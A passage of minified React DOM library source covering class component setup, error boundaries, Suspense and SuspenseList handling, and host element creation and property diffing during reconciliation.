        (o.tag = 2), t != null && (o.callback = t), (t = Qn(e, o, r)), t !== null && (Rt(t, e, r, n), ks(t, e, r));
    },
};
function Jd(e, t, n, r, o, i, s) {
    return (
        (e = e.stateNode),
        typeof e.shouldComponentUpdate == "function"
            ? e.shouldComponentUpdate(r, i, s)
            : t.prototype && t.prototype.isPureReactComponent
              ? !mi(n, r) || !mi(o, i)
              : !0
    );
}
function ih(e, t, n) {
    var r = !1,
        o = er,
        i = t.contextType;
    return (
        typeof i == "object" && i !== null
            ? (i = yt(i))
            : ((o = Ze(t) ? kr : Be.current), (r = t.contextTypes), (i = (r = r != null) ? vo(e, o) : er)),
        (t = new t(n, i)),
        (e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null),
        (t.updater = Ca),
        (e.stateNode = t),
        (t._reactInternals = e),
        r &&
            ((e = e.stateNode),
            (e.__reactInternalMemoizedUnmaskedChildContext = o),
            (e.__reactInternalMemoizedMaskedChildContext = i)),
        t
    );
}
function ep(e, t, n, r) {
    (e = t.state),
        typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r),
        typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r),
        t.state !== e && Ca.enqueueReplaceState(t, t.state, null);
}
function lc(e, t, n, r) {
    var o = e.stateNode;
    (o.props = n), (o.state = e.memoizedState), (o.refs = {}), yu(e);
    var i = t.contextType;
    typeof i == "object" && i !== null ? (o.context = yt(i)) : ((i = Ze(t) ? kr : Be.current), (o.context = vo(e, i))),
        (o.state = e.memoizedState),
        (i = t.getDerivedStateFromProps),
        typeof i == "function" && (ac(e, t, i, n), (o.state = e.memoizedState)),
        typeof t.getDerivedStateFromProps == "function" ||
            typeof o.getSnapshotBeforeUpdate == "function" ||
            (typeof o.UNSAFE_componentWillMount != "function" && typeof o.componentWillMount != "function") ||
            ((t = o.state),
            typeof o.componentWillMount == "function" && o.componentWillMount(),
            typeof o.UNSAFE_componentWillMount == "function" && o.UNSAFE_componentWillMount(),
            t !== o.state && Ca.enqueueReplaceState(o, o.state, null),
            Qs(e, n, o, r),
            (o.state = e.memoizedState)),
        typeof o.componentDidMount == "function" && (e.flags |= 4194308);
}
function bo(e, t) {
    try {
        var n = "",
            r = t;
        do (n += l0(r)), (r = r.return);
        while (r);
        var o = n;
    } catch (i) {
        o =
            `
Error generating stack: ` +
            i.message +
            `
` +
            i.stack;
    }
    return { value: e, source: t, stack: o, digest: null };
}
function hl(e, t, n) {
    return { value: e, source: null, stack: n ?? null, digest: t ?? null };
}
function cc(e, t) {
    try {
        console.error(t.value);
    } catch (n) {
        setTimeout(function () {
            throw n;
        });
    }
}
var D1 = typeof WeakMap == "function" ? WeakMap : Map;
function sh(e, t, n) {
    (n = pn(-1, n)), (n.tag = 3), (n.payload = { element: null });
    var r = t.value;
    return (
        (n.callback = function () {
            Js || ((Js = !0), (xc = r)), cc(e, t);
        }),
        n
    );
}
function ah(e, t, n) {
    (n = pn(-1, n)), (n.tag = 3);
    var r = e.type.getDerivedStateFromError;
    if (typeof r == "function") {
        var o = t.value;
        (n.payload = function () {
            return r(o);
        }),
            (n.callback = function () {
                cc(e, t);
            });
    }
    var i = e.stateNode;
    return (
        i !== null &&
            typeof i.componentDidCatch == "function" &&
            (n.callback = function () {
                cc(e, t), typeof r != "function" && (qn === null ? (qn = new Set([this])) : qn.add(this));
                var s = t.stack;
                this.componentDidCatch(t.value, { componentStack: s !== null ? s : "" });
            }),
        n
    );
}
function tp(e, t, n) {
    var r = e.pingCache;
    if (r === null) {
        r = e.pingCache = new D1();
        var o = new Set();
        r.set(t, o);
    } else (o = r.get(t)), o === void 0 && ((o = new Set()), r.set(t, o));
    o.has(n) || (o.add(n), (e = q1.bind(null, e, t, n)), t.then(e, e));
}
function np(e) {
    do {
        var t;
        if (((t = e.tag === 13) && ((t = e.memoizedState), (t = t !== null ? t.dehydrated !== null : !0)), t)) return e;
        e = e.return;
    } while (e !== null);
    return null;
}
function rp(e, t, n, r, o) {
    return e.mode & 1
        ? ((e.flags |= 65536), (e.lanes = o), e)
        : (e === t
              ? (e.flags |= 65536)
              : ((e.flags |= 128),
                (n.flags |= 131072),
                (n.flags &= -52805),
                n.tag === 1 && (n.alternate === null ? (n.tag = 17) : ((t = pn(-1, 1)), (t.tag = 2), Qn(n, t, 1))),
                (n.lanes |= 1)),
          e);
}
var O1 = wn.ReactCurrentOwner,
    Xe = !1;
function $e(e, t, n, r) {
    t.child = e === null ? Om(t, null, n, r) : wo(t, e.child, n, r);
}
function op(e, t, n, r, o) {
    n = n.render;
    var i = t.ref;
    return (
        oo(t, o),
        (r = bu(e, t, n, r, i, o)),
        (n = ku()),
        e !== null && !Xe
            ? ((t.updateQueue = e.updateQueue), (t.flags &= -2053), (e.lanes &= ~o), yn(e, t, o))
            : (de && n && uu(t), (t.flags |= 1), $e(e, t, r, o), t.child)
    );
}
function ip(e, t, n, r, o) {
    if (e === null) {
        var i = n.type;
        return typeof i == "function" &&
            !Iu(i) &&
            i.defaultProps === void 0 &&
            n.compare === null &&
            n.defaultProps === void 0
            ? ((t.tag = 15), (t.type = i), lh(e, t, i, r, o))
            : ((e = As(n.type, null, r, t, t.mode, o)), (e.ref = t.ref), (e.return = t), (t.child = e));
    }
    if (((i = e.child), !(e.lanes & o))) {
        var s = i.memoizedProps;
        if (((n = n.compare), (n = n !== null ? n : mi), n(s, r) && e.ref === t.ref)) return yn(e, t, o);
    }
    return (t.flags |= 1), (e = Yn(i, r)), (e.ref = t.ref), (e.return = t), (t.child = e);
}
function lh(e, t, n, r, o) {
    if (e !== null) {
        var i = e.memoizedProps;
        if (mi(i, r) && e.ref === t.ref)
            if (((Xe = !1), (t.pendingProps = r = i), (e.lanes & o) !== 0)) e.flags & 131072 && (Xe = !0);
            else return (t.lanes = e.lanes), yn(e, t, o);
    }
    return uc(e, t, n, r, o);
}
function ch(e, t, n) {
    var r = t.pendingProps,
        o = r.children,
        i = e !== null ? e.memoizedState : null;
    if (r.mode === "hidden")
        if (!(t.mode & 1))
            (t.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }), se(Zr, nt), (nt |= n);
        else {
            if (!(n & 1073741824))
                return (
                    (e = i !== null ? i.baseLanes | n : n),
                    (t.lanes = t.childLanes = 1073741824),
                    (t.memoizedState = { baseLanes: e, cachePool: null, transitions: null }),
                    (t.updateQueue = null),
                    se(Zr, nt),
                    (nt |= e),
                    null
                );
            (t.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }),
                (r = i !== null ? i.baseLanes : n),
                se(Zr, nt),
                (nt |= r);
        }
    else i !== null ? ((r = i.baseLanes | n), (t.memoizedState = null)) : (r = n), se(Zr, nt), (nt |= r);
    return $e(e, t, o, n), t.child;
}
function uh(e, t) {
    var n = t.ref;
    ((e === null && n !== null) || (e !== null && e.ref !== n)) && ((t.flags |= 512), (t.flags |= 2097152));
}
function uc(e, t, n, r, o) {
    var i = Ze(n) ? kr : Be.current;
    return (
        (i = vo(t, i)),
        oo(t, o),
        (n = bu(e, t, n, r, i, o)),
        (r = ku()),
        e !== null && !Xe
            ? ((t.updateQueue = e.updateQueue), (t.flags &= -2053), (e.lanes &= ~o), yn(e, t, o))
            : (de && r && uu(t), (t.flags |= 1), $e(e, t, n, o), t.child)
    );
}
function sp(e, t, n, r, o) {
    if (Ze(n)) {
        var i = !0;
        $s(t);
    } else i = !1;
    if ((oo(t, o), t.stateNode === null)) Es(e, t), ih(t, n, r), lc(t, n, r, o), (r = !0);
    else if (e === null) {
        var s = t.stateNode,
            a = t.memoizedProps;
        s.props = a;
        var c = s.context,
            u = n.contextType;
        typeof u == "object" && u !== null ? (u = yt(u)) : ((u = Ze(n) ? kr : Be.current), (u = vo(t, u)));
        var d = n.getDerivedStateFromProps,
            p = typeof d == "function" || typeof s.getSnapshotBeforeUpdate == "function";
        p ||
            (typeof s.UNSAFE_componentWillReceiveProps != "function" &&
                typeof s.componentWillReceiveProps != "function") ||
            ((a !== r || c !== u) && ep(t, s, r, u)),
            (Mn = !1);
        var m = t.memoizedState;
        (s.state = m),
            Qs(t, r, s, o),
            (c = t.memoizedState),
            a !== r || m !== c || Ye.current || Mn
                ? (typeof d == "function" && (ac(t, n, d, r), (c = t.memoizedState)),
                  (a = Mn || Jd(t, n, a, r, m, c, u))
                      ? (p ||
                            (typeof s.UNSAFE_componentWillMount != "function" &&
                                typeof s.componentWillMount != "function") ||
                            (typeof s.componentWillMount == "function" && s.componentWillMount(),
                            typeof s.UNSAFE_componentWillMount == "function" && s.UNSAFE_componentWillMount()),
                        typeof s.componentDidMount == "function" && (t.flags |= 4194308))
                      : (typeof s.componentDidMount == "function" && (t.flags |= 4194308),
                        (t.memoizedProps = r),
                        (t.memoizedState = c)),
                  (s.props = r),
                  (s.state = c),
                  (s.context = u),
                  (r = a))
                : (typeof s.componentDidMount == "function" && (t.flags |= 4194308), (r = !1));
    } else {
        (s = t.stateNode),
            Fm(e, t),
            (a = t.memoizedProps),
            (u = t.type === t.elementType ? a : Ct(t.type, a)),
            (s.props = u),
            (p = t.pendingProps),
            (m = s.context),
            (c = n.contextType),
            typeof c == "object" && c !== null ? (c = yt(c)) : ((c = Ze(n) ? kr : Be.current), (c = vo(t, c)));
        var f = n.getDerivedStateFromProps;
        (d = typeof f == "function" || typeof s.getSnapshotBeforeUpdate == "function") ||
            (typeof s.UNSAFE_componentWillReceiveProps != "function" &&
                typeof s.componentWillReceiveProps != "function") ||
            ((a !== p || m !== c) && ep(t, s, r, c)),
            (Mn = !1),
            (m = t.memoizedState),
            (s.state = m),
            Qs(t, r, s, o);
        var S = t.memoizedState;
        a !== p || m !== S || Ye.current || Mn
            ? (typeof f == "function" && (ac(t, n, f, r), (S = t.memoizedState)),
              (u = Mn || Jd(t, n, u, r, m, S, c) || !1)
                  ? (d ||
                        (typeof s.UNSAFE_componentWillUpdate != "function" &&
                            typeof s.componentWillUpdate != "function") ||
                        (typeof s.componentWillUpdate == "function" && s.componentWillUpdate(r, S, c),
                        typeof s.UNSAFE_componentWillUpdate == "function" && s.UNSAFE_componentWillUpdate(r, S, c)),
                    typeof s.componentDidUpdate == "function" && (t.flags |= 4),
                    typeof s.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024))
                  : (typeof s.componentDidUpdate != "function" ||
                        (a === e.memoizedProps && m === e.memoizedState) ||
                        (t.flags |= 4),
                    typeof s.getSnapshotBeforeUpdate != "function" ||
                        (a === e.memoizedProps && m === e.memoizedState) ||
                        (t.flags |= 1024),
                    (t.memoizedProps = r),
                    (t.memoizedState = S)),
              (s.props = r),
              (s.state = S),
              (s.context = c),
              (r = u))
            : (typeof s.componentDidUpdate != "function" ||
                  (a === e.memoizedProps && m === e.memoizedState) ||
                  (t.flags |= 4),
              typeof s.getSnapshotBeforeUpdate != "function" ||
                  (a === e.memoizedProps && m === e.memoizedState) ||
                  (t.flags |= 1024),
              (r = !1));
    }
    return dc(e, t, n, r, i, o);
}
function dc(e, t, n, r, o, i) {
    uh(e, t);
    var s = (t.flags & 128) !== 0;
    if (!r && !s) return o && Wd(t, n, !1), yn(e, t, i);
    (r = t.stateNode), (O1.current = t);
    var a = s && typeof n.getDerivedStateFromError != "function" ? null : r.render();
    return (
        (t.flags |= 1),
        e !== null && s ? ((t.child = wo(t, e.child, null, i)), (t.child = wo(t, null, a, i))) : $e(e, t, a, i),
        (t.memoizedState = r.state),
        o && Wd(t, n, !0),
        t.child
    );
}
function dh(e) {
    var t = e.stateNode;
    t.pendingContext ? Vd(e, t.pendingContext, t.pendingContext !== t.context) : t.context && Vd(e, t.context, !1),
        vu(e, t.containerInfo);
}
function ap(e, t, n, r, o) {
    return xo(), pu(o), (t.flags |= 256), $e(e, t, n, r), t.child;
}
var pc = { dehydrated: null, treeContext: null, retryLane: 0 };
function fc(e) {
    return { baseLanes: e, cachePool: null, transitions: null };
}
function ph(e, t, n) {
    var r = t.pendingProps,
        o = pe.current,
        i = !1,
        s = (t.flags & 128) !== 0,
        a;
    if (
        ((a = s) || (a = e !== null && e.memoizedState === null ? !1 : (o & 2) !== 0),
        a ? ((i = !0), (t.flags &= -129)) : (e === null || e.memoizedState !== null) && (o |= 1),
        se(pe, o & 1),
        e === null)
    )
        return (
            ic(t),
            (e = t.memoizedState),
            e !== null && ((e = e.dehydrated), e !== null)
                ? (t.mode & 1 ? (e.data === "$!" ? (t.lanes = 8) : (t.lanes = 1073741824)) : (t.lanes = 1), null)
                : ((s = r.children),
                  (e = r.fallback),
                  i
                      ? ((r = t.mode),
                        (i = t.child),
                        (s = { mode: "hidden", children: s }),
                        !(r & 1) && i !== null ? ((i.childLanes = 0), (i.pendingProps = s)) : (i = Na(s, r, 0, null)),
                        (e = Sr(e, r, n, null)),
                        (i.return = t),
                        (e.return = t),
                        (i.sibling = e),
                        (t.child = i),
                        (t.child.memoizedState = fc(n)),
                        (t.memoizedState = pc),
                        e)
                      : Eu(t, s))
        );
    if (((o = e.memoizedState), o !== null && ((a = o.dehydrated), a !== null))) return _1(e, t, s, r, a, o, n);
    if (i) {
        (i = r.fallback), (s = t.mode), (o = e.child), (a = o.sibling);
        var c = { mode: "hidden", children: r.children };
        return (
            !(s & 1) && t.child !== o
                ? ((r = t.child), (r.childLanes = 0), (r.pendingProps = c), (t.deletions = null))
                : ((r = Yn(o, c)), (r.subtreeFlags = o.subtreeFlags & 14680064)),
            a !== null ? (i = Yn(a, i)) : ((i = Sr(i, s, n, null)), (i.flags |= 2)),
            (i.return = t),
            (r.return = t),
            (r.sibling = i),
            (t.child = r),
            (r = i),
            (i = t.child),
            (s = e.child.memoizedState),
            (s = s === null ? fc(n) : { baseLanes: s.baseLanes | n, cachePool: null, transitions: s.transitions }),
            (i.memoizedState = s),
            (i.childLanes = e.childLanes & ~n),
            (t.memoizedState = pc),
            r
        );
    }
    return (
        (i = e.child),
        (e = i.sibling),
        (r = Yn(i, { mode: "visible", children: r.children })),
        !(t.mode & 1) && (r.lanes = n),
        (r.return = t),
        (r.sibling = null),
        e !== null && ((n = t.deletions), n === null ? ((t.deletions = [e]), (t.flags |= 16)) : n.push(e)),
        (t.child = r),
        (t.memoizedState = null),
        r
    );
}
function Eu(e, t) {
    return (t = Na({ mode: "visible", children: t }, e.mode, 0, null)), (t.return = e), (e.child = t);
}
function is(e, t, n, r) {
    return (
        r !== null && pu(r),
        wo(t, e.child, null, n),
        (e = Eu(t, t.pendingProps.children)),
        (e.flags |= 2),
        (t.memoizedState = null),
        e
    );
}
function _1(e, t, n, r, o, i, s) {
    if (n)
        return t.flags & 256
            ? ((t.flags &= -257), (r = hl(Error(j(422)))), is(e, t, s, r))
            : t.memoizedState !== null
              ? ((t.child = e.child), (t.flags |= 128), null)
              : ((i = r.fallback),
                (o = t.mode),
                (r = Na({ mode: "visible", children: r.children }, o, 0, null)),
                (i = Sr(i, o, s, null)),
                (i.flags |= 2),
                (r.return = t),
                (i.return = t),
                (r.sibling = i),
                (t.child = r),
                t.mode & 1 && wo(t, e.child, null, s),
                (t.child.memoizedState = fc(s)),
                (t.memoizedState = pc),
                i);
    if (!(t.mode & 1)) return is(e, t, s, null);
    if (o.data === "$!") {
        if (((r = o.nextSibling && o.nextSibling.dataset), r)) var a = r.dgst;
        return (r = a), (i = Error(j(419))), (r = hl(i, r, void 0)), is(e, t, s, r);
    }
    if (((a = (s & e.childLanes) !== 0), Xe || a)) {
        if (((r = Ae), r !== null)) {
            switch (s & -s) {
                case 4:
                    o = 2;
                    break;
                case 16:
                    o = 8;
                    break;
                case 64:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                case 67108864:
                    o = 32;
                    break;
                case 536870912:
                    o = 268435456;
                    break;
                default:
                    o = 0;
            }
            (o = o & (r.suspendedLanes | s) ? 0 : o),
                o !== 0 && o !== i.retryLane && ((i.retryLane = o), gn(e, o), Rt(r, e, o, -1));
        }
        return Mu(), (r = hl(Error(j(421)))), is(e, t, s, r);
    }
    return o.data === "$?"
        ? ((t.flags |= 128), (t.child = e.child), (t = X1.bind(null, e)), (o._reactRetry = t), null)
        : ((e = i.treeContext),
          (ot = Gn(o.nextSibling)),
          (it = t),
          (de = !0),
          (At = null),
          e !== null && ((ft[mt++] = un), (ft[mt++] = dn), (ft[mt++] = Cr), (un = e.id), (dn = e.overflow), (Cr = t)),
          (t = Eu(t, r.children)),
          (t.flags |= 4096),
          t);
}
function lp(e, t, n) {
    e.lanes |= t;
    var r = e.alternate;
    r !== null && (r.lanes |= t), sc(e.return, t, n);
}
function gl(e, t, n, r, o) {
    var i = e.memoizedState;
    i === null
        ? (e.memoizedState = { isBackwards: t, rendering: null, renderingStartTime: 0, last: r, tail: n, tailMode: o })
        : ((i.isBackwards = t),
          (i.rendering = null),
          (i.renderingStartTime = 0),
          (i.last = r),
          (i.tail = n),
          (i.tailMode = o));
}
function fh(e, t, n) {
    var r = t.pendingProps,
        o = r.revealOrder,
        i = r.tail;
    if (($e(e, t, r.children, n), (r = pe.current), r & 2)) (r = (r & 1) | 2), (t.flags |= 128);
    else {
        if (e !== null && e.flags & 128)
            e: for (e = t.child; e !== null; ) {
                if (e.tag === 13) e.memoizedState !== null && lp(e, n, t);
                else if (e.tag === 19) lp(e, n, t);
                else if (e.child !== null) {
                    (e.child.return = e), (e = e.child);
                    continue;
                }
                if (e === t) break e;
                for (; e.sibling === null; ) {
                    if (e.return === null || e.return === t) break e;
                    e = e.return;
                }
                (e.sibling.return = e.return), (e = e.sibling);
            }
        r &= 1;
    }
    if ((se(pe, r), !(t.mode & 1))) t.memoizedState = null;
    else
        switch (o) {
            case "forwards":
                for (n = t.child, o = null; n !== null; )
                    (e = n.alternate), e !== null && qs(e) === null && (o = n), (n = n.sibling);
                (n = o),
                    n === null ? ((o = t.child), (t.child = null)) : ((o = n.sibling), (n.sibling = null)),
                    gl(t, !1, o, n, i);
                break;
            case "backwards":
                for (n = null, o = t.child, t.child = null; o !== null; ) {
                    if (((e = o.alternate), e !== null && qs(e) === null)) {
                        t.child = o;
                        break;
                    }
                    (e = o.sibling), (o.sibling = n), (n = o), (o = e);
                }
                gl(t, !0, n, null, i);
                break;
            case "together":
                gl(t, !1, null, null, void 0);
                break;
            default:
                t.memoizedState = null;
        }
    return t.child;
}
function Es(e, t) {
    !(t.mode & 1) && e !== null && ((e.alternate = null), (t.alternate = null), (t.flags |= 2));
}
function yn(e, t, n) {
    if ((e !== null && (t.dependencies = e.dependencies), (Er |= t.lanes), !(n & t.childLanes))) return null;
    if (e !== null && t.child !== e.child) throw Error(j(153));
    if (t.child !== null) {
        for (e = t.child, n = Yn(e, e.pendingProps), t.child = n, n.return = t; e.sibling !== null; )
            (e = e.sibling), (n = n.sibling = Yn(e, e.pendingProps)), (n.return = t);
        n.sibling = null;
    }
    return t.child;
}
function F1(e, t, n) {
    switch (t.tag) {
        case 3:
            dh(t), xo();
            break;
        case 5:
            zm(t);
            break;
        case 1:
            Ze(t.type) && $s(t);
            break;
        case 4:
            vu(t, t.stateNode.containerInfo);
            break;
        case 10:
            var r = t.type._context,
                o = t.memoizedProps.value;
            se(Ks, r._currentValue), (r._currentValue = o);
            break;
        case 13:
            if (((r = t.memoizedState), r !== null))
                return r.dehydrated !== null
                    ? (se(pe, pe.current & 1), (t.flags |= 128), null)
                    : n & t.child.childLanes
                      ? ph(e, t, n)
                      : (se(pe, pe.current & 1), (e = yn(e, t, n)), e !== null ? e.sibling : null);
            se(pe, pe.current & 1);
            break;
        case 19:
            if (((r = (n & t.childLanes) !== 0), e.flags & 128)) {
                if (r) return fh(e, t, n);
                t.flags |= 128;
            }
            if (
                ((o = t.memoizedState),
                o !== null && ((o.rendering = null), (o.tail = null), (o.lastEffect = null)),
                se(pe, pe.current),
                r)
            )
                break;
            return null;
        case 22:
        case 23:
            return (t.lanes = 0), ch(e, t, n);
    }
    return yn(e, t, n);
}
var mh, mc, hh, gh;
mh = function (e, t) {
    for (var n = t.child; n !== null; ) {
        if (n.tag === 5 || n.tag === 6) e.appendChild(n.stateNode);
        else if (n.tag !== 4 && n.child !== null) {
            (n.child.return = n), (n = n.child);
            continue;
        }
        if (n === t) break;
        for (; n.sibling === null; ) {
            if (n.return === null || n.return === t) return;
            n = n.return;
        }
        (n.sibling.return = n.return), (n = n.sibling);
    }
};
mc = function () {};
hh = function (e, t, n, r) {
    var o = e.memoizedProps;
    if (o !== r) {
        (e = t.stateNode), fr(Qt.current);
        var i = null;
        switch (n) {
            case "input":
                (o = Ol(e, o)), (r = Ol(e, r)), (i = []);
                break;
            case "select":
                (o = me({}, o, { value: void 0 })), (r = me({}, r, { value: void 0 })), (i = []);
                break;
            case "textarea":
                (o = zl(e, o)), (r = zl(e, r)), (i = []);
                break;
            default:
                typeof o.onClick != "function" && typeof r.onClick == "function" && (e.onclick = Us);
        }
        Ul(n, r);
        var s;
        n = null;
        for (u in o)
            if (!r.hasOwnProperty(u) && o.hasOwnProperty(u) && o[u] != null)
                if (u === "style") {
                    var a = o[u];
                    for (s in a) a.hasOwnProperty(s) && (n || (n = {}), (n[s] = ""));
                } else
                    u !== "dangerouslySetInnerHTML" &&
                        u !== "children" &&
                        u !== "suppressContentEditableWarning" &&
                        u !== "suppressHydrationWarning" &&
                        u !== "autoFocus" &&
                        (ai.hasOwnProperty(u) ? i || (i = []) : (i = i || []).push(u, null));
        for (u in r) {
            var c = r[u];
            if (((a = o != null ? o[u] : void 0), r.hasOwnProperty(u) && c !== a && (c != null || a != null)))
                if (u === "style")
                    if (a) {
                        for (s in a) !a.hasOwnProperty(s) || (c && c.hasOwnProperty(s)) || (n || (n = {}), (n[s] = ""));
                        for (s in c) c.hasOwnProperty(s) && a[s] !== c[s] && (n || (n = {}), (n[s] = c[s]));
                    } else n || (i || (i = []), i.push(u, n)), (n = c);
                else
                    u === "dangerouslySetInnerHTML"
                        ? ((c = c ? c.__html : void 0),
                          (a = a ? a.__html : void 0),
                          c != null && a !== c && (i = i || []).push(u, c))
                        : u === "children"
                          ? (typeof c != "string" && typeof c != "number") || (i = i || []).push(u, "" + c)
                          : u !== "suppressContentEditableWarning" &&
                            u !== "suppressHydrationWarning" &&
                            (ai.hasOwnProperty(u)
                                ? (c != null && u === "onScroll" && le("scroll", e), i || a === c || (i = []))
                                : (i = i || []).push(u, c));
        }
        n && (i = i || []).push("style", n);
        var u = i;
        (t.updateQueue = u) && (t.flags |= 4);
    }
};
gh = function (e, t, n, r) {
    n !== r && (t.flags |= 4);
};
function Uo(e, t) {
    if (!de)
        switch (e.tailMode) {
            case "hidden":
                t = e.tail;
                for (var n = null; t !== null; ) t.alternate !== null && (n = t), (t = t.sibling);
                n === null ? (e.tail = null) : (n.sibling = null);
                break;
            case "collapsed":
                n = e.tail;
                for (var r = null; n !== null; ) n.alternate !== null && (r = n), (n = n.sibling);
                r === null ? (t || e.tail === null ? (e.tail = null) : (e.tail.sibling = null)) : (r.sibling = null);
        }
}
function _e(e) {
    var t = e.alternate !== null && e.alternate.child === e.child,
        n = 0,
        r = 0;
    if (t)
        for (var o = e.child; o !== null; )
            (n |= o.lanes | o.childLanes),
                (r |= o.subtreeFlags & 14680064),
                (r |= o.flags & 14680064),
                (o.return = e),
                (o = o.sibling);
    else
        for (o = e.child; o !== null; )
            (n |= o.lanes | o.childLanes), (r |= o.subtreeFlags), (r |= o.flags), (o.return = e), (o = o.sibling);
    return (e.subtreeFlags |= r), (e.childLanes = n), t;
}
function z1(e, t, n) {
    var r = t.pendingProps;
    switch ((du(t), t.tag)) {
        case 2:
        case 16:
        case 15:
        case 0:
        case 11:
        case 7:
        case 8:
        case 12:
        case 9:
        case 14:
            return _e(t), null;
        case 1:
            return Ze(t.type) && Hs(), _e(t), null;
        case 3:
            return (
                (r = t.stateNode),
                So(),
                ce(Ye),
                ce(Be),
                wu(),
                r.pendingContext && ((r.context = r.pendingContext), (r.pendingContext = null)),
                (e === null || e.child === null) &&
                    (rs(t)
                        ? (t.flags |= 4)
                        : e === null ||
                          (e.memoizedState.isDehydrated && !(t.flags & 256)) ||
                          ((t.flags |= 1024), At !== null && (bc(At), (At = null)))),
                mc(e, t),
                _e(t),
                null
            );
        case 5:
            xu(t);
            var o = fr(xi.current);
            if (((n = t.type), e !== null && t.stateNode != null))
                hh(e, t, n, r, o), e.ref !== t.ref && ((t.flags |= 512), (t.flags |= 2097152));
            else {
                if (!r) {
                    if (t.stateNode === null) throw Error(j(166));
                    return _e(t), null;
                }
                if (((e = fr(Qt.current)), rs(t))) {
                    (r = t.stateNode), (n = t.type);
                    var i = t.memoizedProps;
                    switch (((r[Wt] = t), (r[yi] = i), (e = (t.mode & 1) !== 0), n)) {
                        case "dialog":
                            le("cancel", r), le("close", r);
                            break;
                        case "iframe":
                        case "object":
                        case "embed":
                            le("load", r);
                            break;
                        case "video":
                        case "audio":
                            for (o = 0; o < qo.length; o++) le(qo[o], r);
                            break;
                        case "source":
                            le("error", r);
                            break;
                        case "img":
                        case "image":
                        case "link":
                            le("error", r), le("load", r);
                            break;
                        case "details":
                            le("toggle", r);
                            break;
                        case "input":
                            yd(r, i), le("invalid", r);
                            break;
                        case "select":
                            (r._wrapperState = { wasMultiple: !!i.multiple }), le("invalid", r);
                            break;
                        case "textarea":
                            xd(r, i), le("invalid", r);
                    }
                    Ul(n, i), (o = null);
                    for (var s in i)
                        if (i.hasOwnProperty(s)) {
                            var a = i[s];
                            s === "children"
                                ? typeof a == "string"
                                    ? r.textContent !== a &&
                                      (i.suppressHydrationWarning !== !0 && ns(r.textContent, a, e),
                                      (o = ["children", a]))
                                    : typeof a == "number" &&
                                      r.textContent !== "" + a &&
                                      (i.suppressHydrationWarning !== !0 && ns(r.textContent, a, e),
                                      (o = ["children", "" + a]))
                                : ai.hasOwnProperty(s) && a != null && s === "onScroll" && le("scroll", r);
                        }
                    switch (n) {
                        case "input":
                            Qi(r), vd(r, i, !0);
                            break;
                        case "textarea":
                            Qi(r), wd(r);
                            break;
                        case "select":
                        case "option":
                            break;
                        default:
                            typeof i.onClick == "function" && (r.onclick = Us);
                    }
                    (r = o), (t.updateQueue = r), r !== null && (t.flags |= 4);
                } else {
                    (s = o.nodeType === 9 ? o : o.ownerDocument),
                        e === "http://www.w3.org/1999/xhtml" && (e = Vf(n)),
                        e === "http://www.w3.org/1999/xhtml"
                            ? n === "script"
                                ? ((e = s.createElement("div")),
                                  (e.innerHTML = "<script></script>"),
                                  (e = e.removeChild(e.firstChild)))
                                : typeof r.is == "string"
                                  ? (e = s.createElement(n, { is: r.is }))
                                  : ((e = s.createElement(n)),
                                    n === "select" &&
                                        ((s = e), r.multiple ? (s.multiple = !0) : r.size && (s.size = r.size)))
                            : (e = s.createElementNS(e, n)),
                        (e[Wt] = t),
                        (e[yi] = r),
                        mh(e, t, !1, !1),
                        (t.stateNode = e);
                    e: {
                        switch (((s = Hl(n, r)), n)) {
                            case "dialog":
                                le("cancel", e), le("close", e), (o = r);
                                break;
                            case "iframe":
                            case "object":
                            case "embed":
                                le("load", e), (o = r);
                                break;
                            case "video":
                            case "audio":
                                for (o = 0; o < qo.length; o++) le(qo[o], e);
                                o = r;
                                break;
                            case "source":
                                le("error", e), (o = r);
                                break;
                            case "img":
                            case "image":
                            case "link":
                                le("error", e), le("load", e), (o = r);
                                break;
                            case "details":
                                le("toggle", e), (o = r);
                                break;
                            case "input":
                                yd(e, r), (o = Ol(e, r)), le("invalid", e);
                                break;
                            case "option":
                                o = r;
                                break;
                            case "select":
                                (e._wrapperState = { wasMultiple: !!r.multiple }),
                                    (o = me({}, r, { value: void 0 })),
                                    le("invalid", e);
                                break;
                            case "textarea":
                                xd(e, r), (o = zl(e, r)), le("invalid", e);
                                break;
                            default:
                                o = r;
                        }
                        Ul(n, o), (a = o);
                        for (i in a)
                            if (a.hasOwnProperty(i)) {
                                var c = a[i];
                                i === "style"
                                    ? Gf(e, c)
                                    : i === "dangerouslySetInnerHTML"
                                      ? ((c = c ? c.__html : void 0), c != null && Wf(e, c))
                                      : i === "children"
                                        ? typeof c == "string"
                                            ? (n !== "textarea" || c !== "") && li(e, c)
                                            : typeof c == "number" && li(e, "" + c)
                                        : i !== "suppressContentEditableWarning" &&
                                          i !== "suppressHydrationWarning" &&
                                          i !== "autoFocus" &&
                                          (ai.hasOwnProperty(i)
                                              ? c != null && i === "onScroll" && le("scroll", e)
                                              : c != null && Xc(e, i, c, s));
                            }
                        switch (n) {
                            case "input":
                                Qi(e), vd(e, r, !1);
                                break;
                            case "textarea":
                                Qi(e), wd(e);
                                break;
                            case "option":
                                r.value != null && e.setAttribute("value", "" + Jn(r.value));
                                break;
                            case "select":
                                (e.multiple = !!r.multiple),
                                    (i = r.value),
                                    i != null
                                        ? eo(e, !!r.multiple, i, !1)
                                        : r.defaultValue != null && eo(e, !!r.multiple, r.defaultValue, !0);
                                break;
                            default:
                                typeof o.onClick == "function" && (e.onclick = Us);
                        }
                        switch (n) {
                            case "button":
                            case "input":
                            case "select":
                            case "textarea":
                                r = !!r.autoFocus;
                                break e;
                            case "img":
                                r = !0;
                                break e;
                            default:
                                r = !1;
                        }
                    }
                    r && (t.flags |= 4);
                }
                t.ref !== null && ((t.flags |= 512), (t.flags |= 2097152));
            }
            return _e(t), null;
        case 6:
            if (e && t.stateNode != null) gh(e, t, e.memoizedProps, r);
            else {
                if (typeof r != "string" && t.stateNode === null) throw Error(j(166));
                if (((n = fr(xi.current)), fr(Qt.current), rs(t))) {
                    if (
                        ((r = t.stateNode),
                        (n = t.memoizedProps),
